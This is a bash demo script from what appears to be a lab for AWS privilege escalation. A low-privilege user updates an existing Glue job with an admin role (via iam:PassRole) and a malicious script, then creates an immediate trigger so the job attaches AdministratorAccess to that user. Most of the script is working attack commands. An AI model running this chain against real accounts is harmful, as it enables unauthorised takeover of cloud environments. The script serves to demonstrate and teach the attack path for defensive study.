#!/bin/bash

# Demo script for iam:PassRole + glue:UpdateJob + glue:CreateTrigger privilege escalation
# This scenario demonstrates how a user with PassRole, UpdateJob, and CreateTrigger can update
# an existing Glue job to use an admin role and malicious script, then trigger it for immediate escalation

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-guj-ct-to-admin-starting-user"
TARGET_ROLE="pl-prod-guj-ct-to-admin-target-role"
INITIAL_ROLE="pl-prod-guj-ct-to-admin-initial-role"
RANDOM_SUFFIX=$(date +%s | tail -c 6)
TRIGGER_NAME="pl-guj-ct-demo-trigger-${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue UpdateJob + CreateTrigger Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_glue_updatejob_glue_createtrigger.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Retrieve pre-uploaded script locations from Terraform
echo -e "${YELLOW}Step 5: Retrieving pre-uploaded Glue job scripts from Terraform${NC}"

cd ../../../../../..  # Navigate to root
BENIGN_SCRIPT_S3_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.benign_script_s3_path')
MALICIOUS_SCRIPT_S3_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.malicious_script_s3_path')
SCRIPT_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.script_bucket_name')
cd - > /dev/null  # Return to scenario directory

if [ "$BENIGN_SCRIPT_S3_PATH" == "null" ] || [ -z "$BENIGN_SCRIPT_S3_PATH" ]; then
    echo -e "${RED}Error: Could not retrieve script S3 paths from terraform output${NC}"
    exit 1
fi

echo "Benign script S3 path: $BENIGN_SCRIPT_S3_PATH"
echo "Malicious script S3 path: $MALICIOUS_SCRIPT_S3_PATH"
echo "Script bucket: $SCRIPT_BUCKET"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The Python scripts were pre-uploaded by Terraform to a bucket in this account for demonstration.${NC}"
echo -e "${BLUE}  In a real attack, the malicious script would typically be in an attacker-controlled S3 bucket${NC}"
echo -e "${BLUE}  in another account that grants public read access. The starting user can read from this bucket${NC}"
echo -e "${BLUE}  via a bucket policy (not IAM permissions), simulating access to a public attacker bucket.${NC}"
echo ""
echo -e "${GREEN}✓ Retrieved script locations from Terraform${NC}\n"

# Step 6: Get pre-created job name from Terraform
echo -e "${YELLOW}Step 6: Retrieving pre-created Glue job name from Terraform${NC}"

cd ../../../../../..  # Navigate to root
GLUE_JOB_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.glue_job_name')
cd - > /dev/null  # Return to scenario directory

if [ "$GLUE_JOB_NAME" == "null" ] || [ -z "$GLUE_JOB_NAME" ]; then
    echo -e "${RED}Error: Could not retrieve Glue job name from terraform output${NC}"
    exit 1
fi

echo "Pre-created Glue job: $GLUE_JOB_NAME"
echo -e "${GREEN}✓ Retrieved job name from Terraform${NC}\n"

# Step 7: Show current job configuration
echo -e "${YELLOW}Step 7: Showing current job configuration${NC}"
echo "Retrieving current configuration of job: $GLUE_JOB_NAME"
echo ""

JOB_CONFIG=$(aws glue get-job \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --output json)

CURRENT_ROLE=$(echo "$JOB_CONFIG" | jq -r '.Job.Role')
CURRENT_SCRIPT=$(echo "$JOB_CONFIG" | jq -r '.Job.Command.ScriptLocation')

echo "Current job configuration:"
echo "  Role: $CURRENT_ROLE"
echo "  Script: $CURRENT_SCRIPT"
echo ""
echo -e "${GREEN}✓ Retrieved current job configuration${NC}\n"

# Step 8: Update Glue job with admin role and malicious script
echo -e "${YELLOW}Step 8: Updating Glue job with admin role and malicious script${NC}"
echo "This is the privilege escalation vector - updating the job with the admin role..."
echo "Job name: $GLUE_JOB_NAME"
echo "New role: $TARGET_ROLE"
echo "New script: $MALICIOUS_SCRIPT_S3_PATH"

TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"

aws glue update-job \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --job-update "Role=${TARGET_ROLE_ARN},Command={Name=pythonshell,ScriptLocation=${MALICIOUS_SCRIPT_S3_PATH},PythonVersion=3.9}" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated Glue job: $GLUE_JOB_NAME${NC}"
    echo "  → Changed role from $INITIAL_ROLE to $TARGET_ROLE"
    echo "  → Changed script to malicious escalation script"
else
    echo -e "${RED}Error: Failed to update Glue job${NC}"
    exit 1
fi
echo ""

# Step 9: Create scheduled trigger that starts immediately
echo -e "${YELLOW}Step 9: Creating trigger that starts immediately${NC}"
echo "Trigger name: $TRIGGER_NAME"
echo "Using scheduled trigger with --start-on-creation flag..."

aws glue create-trigger \
    --region $AWS_REGION \
    --name "$TRIGGER_NAME" \
    --type SCHEDULED \
    --start-on-creation \
    --schedule "cron(0/1 * * * ? *)" \
    --actions '[{"JobName": "'$GLUE_JOB_NAME'"}]' \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created trigger: $TRIGGER_NAME${NC}"
    echo "The trigger will fire immediately and run the job"
else
    echo -e "${RED}Error: Failed to create trigger${NC}"
    exit 1
fi
echo ""

# Step 10: Wait for trigger to fire and job to complete
echo -e "${YELLOW}Step 10: Waiting for trigger to fire and job to complete${NC}"
echo "Note: Scheduled triggers fire at the next scheduled time (every minute in this case)"
echo "This may take 1-3 minutes depending on when in the minute cycle we created the trigger..."
echo ""

# Check trigger state
echo "Verifying trigger state..."
TRIGGER_STATE=$(aws glue get-trigger \
    --region $AWS_REGION \
    --name "$TRIGGER_NAME" \
    --query 'Trigger.State' \
    --output text 2>/dev/null)

echo "Trigger state: $TRIGGER_STATE"
if [ "$TRIGGER_STATE" != "ACTIVATED" ]; then
    echo -e "${YELLOW}Warning: Trigger is not in ACTIVATED state${NC}"
fi
echo ""

MAX_WAIT=180  # 3 minutes
ELAPSED=0
JOB_RUN_ID=""

# Wait for the job run to be initiated
echo "Waiting for trigger to fire and job to run (checking every 10 seconds)..."

while [ $ELAPSED -lt $MAX_WAIT ]; do
    # Get the latest job run
    JOB_RUNS=$(aws glue get-job-runs \
        --region $AWS_REGION \
        --job-name "$GLUE_JOB_NAME" \
        --max-results 1 \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        JOB_RUN_ID=$(echo "$JOB_RUNS" | jq -r '.JobRuns[0].Id // empty')

        if [ -n "$JOB_RUN_ID" ]; then
            JOB_RUN_STATE=$(echo "$JOB_RUNS" | jq -r '.JobRuns[0].JobRunState')

            echo "  [${ELAPSED}s] Job run $JOB_RUN_ID: $JOB_RUN_STATE"

            if [ "$JOB_RUN_STATE" = "SUCCEEDED" ]; then
                echo -e "${GREEN}✓ Job run completed successfully!${NC}"
                break
            elif [ "$JOB_RUN_STATE" = "FAILED" ] || [ "$JOB_RUN_STATE" = "ERROR" ] || [ "$JOB_RUN_STATE" = "STOPPED" ]; then
                echo -e "${RED}✗ Job run failed with state: $JOB_RUN_STATE${NC}"
                echo "Fetching error details..."
                aws glue get-job-run \
                    --region $AWS_REGION \
                    --job-name "$GLUE_JOB_NAME" \
                    --run-id "$JOB_RUN_ID" \
                    --query 'JobRun.ErrorMessage' \
                    --output text
                exit 1
            fi
        else
            echo "  [${ELAPSED}s] Waiting for trigger to fire..."
        fi
    fi

    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Timeout waiting for job to complete${NC}"
    echo ""
    echo "Trigger state at timeout:"
    aws glue get-trigger \
        --region $AWS_REGION \
        --name "$TRIGGER_NAME" \
        --output json | jq '{State: .Trigger.State, Schedule: .Trigger.Schedule}'
    echo ""
    echo "Checking if any job runs exist:"
    aws glue get-job-runs \
        --region $AWS_REGION \
        --job-name "$GLUE_JOB_NAME" \
        --output json | jq '.JobRuns | length'
    exit 1
fi
echo ""

# Step 11: Wait for IAM policy propagation
echo -e "${YELLOW}Step 11: Waiting for IAM policy to propagate${NC}"
echo "Waiting 15 seconds for AdministratorAccess policy to take effect..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Retrieved pre-uploaded scripts from S3 (deployed by Terraform)"
echo "3. Found pre-existing Glue job: $GLUE_JOB_NAME"
echo "4. Updated job configuration:"
echo "   → Changed role from $INITIAL_ROLE to $TARGET_ROLE (admin)"
echo "   → Changed script to malicious escalation script"
echo "5. Created scheduled trigger: $TRIGGER_NAME with --start-on-creation"
echo "6. Trigger fired immediately and executed the updated job"
echo "7. Job attached AdministratorAccess policy to starting user"
echo "8. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (glue:UpdateJob + iam:PassRole) → Updated $GLUE_JOB_NAME with $TARGET_ROLE"
echo -e "  → (glue:CreateTrigger --start-on-creation) → $TRIGGER_NAME"
echo -e "  → Job executes with admin role"
echo -e "  → Attaches AdministratorAccess to $STARTING_USER"
echo -e "  → Admin access achieved"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue Job: $GLUE_JOB_NAME (modified, needs restoration)"
echo "- Glue Trigger: $TRIGGER_NAME (needs deletion)"
echo "- IAM Policy Attachment: AdministratorAccess on $STARTING_USER (needs removal)"

echo -e "\n${RED}⚠ Warning: The Glue job configuration has been modified${NC}"
echo -e "${RED}⚠ The Glue trigger is still deployed${NC}"
echo -e "${RED}⚠ The starting user still has AdministratorAccess attached${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
